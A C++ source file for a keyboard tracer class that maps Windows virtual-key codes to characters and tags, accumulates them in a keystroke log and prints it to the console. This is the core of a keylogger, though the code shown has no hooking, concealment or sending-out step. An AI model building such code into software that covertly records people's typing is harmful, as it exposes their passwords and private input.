#include "pch.h"
#include "keyboard_tracer.h"


KeyboardTracer::KeyboardTracer()
{
	key_log = "";
}

KeyboardTracer::~KeyboardTracer(){}

void KeyboardTracer::setLpBinary(LPARAM lparam)
{
    for (int i = 0; lparam > 0; i++)
    {
        *lp_binary[i] = lparam % 2;
        lparam = lparam / 2;
    }
}

int* KeyboardTracer::getLpBinary()
{
    return *lp_binary;
}

int KeyboardTracer::getLpBinary(int n)
{
    return *lp_binary[n];
}

void KeyboardTracer::registKeyLog(WPARAM virkey)
{
    key_log += transVirtualKey(virkey);
}

void KeyboardTracer::print_log()
{
    std::cout << key_log << std::endl;
}

std::string KeyboardTracer::transVirtualKey(WPARAM virkey)
{
    std::string ret = "";
    switch (virkey)
    {
    case 0x08:
        ret += "[BACK]";
        break;
    case 0x0d://enter
        ret += "[ENTER]";
        break;
    case 0x20:
        ret += " ";
        break;
    case 0x25:// left
        ret += "[LEFT]";
        break;
    case 0x26:
        ret += "[UP]";
        break;
    case 0x27:
        ret += "[RIGHT]";
        break;
    case 0x28:
        ret += "[DOWN]";
        break;
    case 0x2e://clear
        ret += "[CLEAR]";
        break;
    case 0x30:
        ret += "0";
        break;
    case 0x31:
        ret += "1";
        break;
    case 0x32:
        ret += "2";
        break;
    case 0x33:
        ret += "3";
        break;
    case 0x34:
        ret += "4";
        break;
    case 0x35:
        ret += "5";
        break;
    case 0x36:
        ret += "6";
        break;
    case 0x37:
        ret += "7";
        break;
    case 0x38:
        ret += "8";
        break;
    case 0x39:
        ret += "9";
        break;
    case 0x41:
        ret += "a";
        break;
    case 0x42:
        ret += "b";
        break;
    case 0x43:
        ret += "c";
        break;
    case 0x44:
        ret += "d";
        break;
    case 0x45:
        ret += "e";
        break;
    case 0x46:
        ret += "f";
        break;
    case 0x47:
        ret += "g";
        break;
    case 0x48:
        ret += "h";
        break;
    case 0x49:
        ret += "i";
        break;
    case 0x4a:
        ret += "j";
        break;
    case 0x4b:
        ret += "k";
        break;
    case 0x4c:
        ret += "l";
        break;
    case 0x4d:
        ret += "m";
        break;
    case 0x4e:
        ret += "n";
        break;
    case 0x4f:
        ret += "o";
        break;
    case 0x50:
        ret += "p";
        break;
    case 0x51:
        ret += "q";
        break;
    case 0x52:
        ret += "r";
        break;
    case 0x53:
        ret += "s";
        break;
    case 0x54:
        ret += "t";
        break;
    case 0x55:
        ret += "u";
        break;
    case 0x56:
        ret += "v";
        break;
    case 0x57:
        ret += "w";
        break;
    case 0x58:
        ret += "x";
        break;
    case 0x59:
        ret += "y";
        break;
    case 0x5a:
        ret += "z";
        break;
    case 0xba:
        ret += ":";
        break;
    case 0xbb:
        ret += ";";
        break;
    case 0xbc:
        ret += ",";
        break;
    case 0xbd:
        ret += "-";
        break;
    case 0xbe:
        ret += ".";
        break;
    case 0xbf:
        ret += "/";
        break;
    case 0xc0:
        ret += "@";
        break;
    case 0xdb:
        ret += "[";
        break;
    case 0xdc:
        ret += "\\";
        break;
    case 0xdd:
        ret += "]";
        break;
    case 0xde:
        ret += "^";
        break;
    default:
        ret += "?";
        break;
    }
    return ret;
}